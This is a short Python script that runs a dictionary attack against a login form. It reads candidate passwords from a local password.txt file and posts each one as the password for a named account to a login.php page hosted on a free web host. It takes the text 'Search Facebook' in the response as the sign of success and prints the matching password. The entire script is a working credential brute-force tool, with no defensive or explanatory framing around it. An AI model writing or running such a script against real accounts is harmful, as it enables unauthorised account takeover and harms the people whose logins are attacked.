import requests

url = 'https://haxcoderyeah.000webhostapp.com/login.php'
arq = open ('password.txt', 'r').readlines()

for line in arq:
	password = line.strip()
	https = requests.post(url, data = {'email':'angelica.hax','pass':password , 'login':'submit'})
	content = https.content
	if "Search Facebook" in content:
		print("============== PASSWORD IS:" +password+"==============")
		break
	else:
		print("[-]Password is invalid:" +password)
